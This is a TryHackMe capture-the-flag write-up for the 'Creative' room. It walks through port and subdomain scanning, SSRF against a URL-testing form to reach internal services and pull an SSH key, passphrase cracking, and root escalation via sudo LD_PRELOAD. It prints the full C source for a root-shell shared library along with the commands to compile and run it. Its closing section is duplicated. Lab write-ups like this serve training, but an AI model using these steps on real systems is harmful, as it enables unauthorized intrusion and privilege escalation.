**# Creative | TryHackMe Write-Up**



Hey, I am back with another write-up. Try this room and many more at TryHackMe!!!



\## NMAP Scan



!\[scan](images/creative1.png)



nmap -sV -sC \[IP] -T5



We got two port open 22 and 80



Port 80

Let’s visit port 80



!\[scan](images/creative2.png)





Let’s do gobuster for directory enumeration



!\[scan](images/creative3.png)





gobuster dir -u \[URL] -w /path/to/wordlist



Unfortunately, the Gobuster scan did not find anything interesting on the web server.

Let’s look for subdomains



!\[scan](images/creative4.png)







wfuzz -c -u http://creative.thm -H “Host: FUZZ.creative.thm” -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt — hc 302,400,301



we found beta.creative.thm



Press enter or click to view image in full size



!\[scan](images/creative5.png)





we see a form where we can submit URLs for testing.



Testing it with http://creative.thm/, it returns the contents of the URL submitted.





!\[scan](images/creative6.png)







Also testing http://127.0.0.1/, we get the contents of the page. So, there does not seem to be a filter in place preventing us from accessing services on localhost.

Discovering the Internal Web Server

We can use this functionality to scan for internal web servers using wfuzz.



!\[scan](images/creative7.png)





wfuzz -c -z range,1–65535 -d “url=http://127.0.0.1:FUZZ/" -H “Content-Type: application/x-www-form-urlencoded” — hl 0 — hc 404,403 http://beta.creative.thm/



We found 1337 port is also open



Port 1337

Let’s visit port 1337



!\[scan](images/creative8.png)





let’s visit http://127.0.0.1/home





!\[scan](images/creative9.png)



Exploit

We request the SSH key and view the page source to save the contents properly.



!\[scan](images/creative10.png)





After having saved the key and changed it to the correct permission, we try to log in via SSH as saad, but we have to enter a passphrase for the SSH key.



!\[scan](images/creative11.png)



We pass the key into ssh2john to generate a crackable hash for John.



now we will use this passphrase and login and found the user.txt



!\[scan](images/creative12.png)



Enumerating the user’s home directory, we find a .bash\_history with content. This holds the credentials for the user saad.





!\[scan](images/creative13.png)





we will use sudo -l



!\[scan](images/creative13.png)

There is not much we can do with ping but there is one interesting thing about the sudo configuration: the env\_keep option on LD\_PRELOAD.



But there is another option present env\_keep+=LD\_PRELOAD. LD\_PRELOAD is an environment variable used on Unix-like operating systems to load additional dynamic libraries before all others when a program is run. This can be used to override functions in other shared libraries.



If an attacker can set LD\_PRELOAD to point to a malicious shared library, and this environment variable is preserved when running commands with sudo, it allows the attacker to execute arbitrary code with elevated privileges.



We make use of the following resource, which provides us with a previously mentioned shared library written in C. This library includes a function that escalates privileges to root by setting the user and group IDs to zero and launching a shell, effectively granting root shell access to the user.



\#include <stdio.h>

\#include <sys/types.h>

\#include <stdlib.h>

void \_init() {

&#x20;unsetenv("LD\_PRELOAD");

&#x20;setgid(0);

&#x20;setuid(0);

&#x20;system("/bin/sh");

}

We compile the C code into a shared library.



gcc -fPIC -shared -o shell.so shell.c -nostartfiles



Next, we execute the ping as sudo and set LD\_PRELOAD to the previously crafted shared library. We get a root shell and are able to extract the root flag at /root.



sudo LD\_PRELOAD=/tmp/shell.so /usr/bin/ping



Press enter or click to view image in full size



running exploit

Now we have root.txt.



The room was nice I enjoyed doing this room



If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics including vulnerability assessments, penetration testing techniques, and security methodologies.



👉 Check out my GitBook for more insights



👉 Watch my videos on YouTube: AnuragSec



Stay tuned for more content, and don’t forget to follow for future updates!



7

We compile the C code into a shared library.



gcc -fPIC -shared -o shell.so shell.c -nostartfiles



Next, we execute the ping as sudo and set LD\_PRELOAD to the previously crafted shared library. We get a root shell and are able to extract the root flag at /root.



sudo LD\_PRELOAD=/tmp/shell.so /usr/bin/ping



Press enter or click to view image in full size





!\[scan](images/creative15.png)



Now we have root.txt.



The room was nice I enjoyed doing this room



If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics including vulnerability assessments, penetration testing techniques, and security methodologies.





















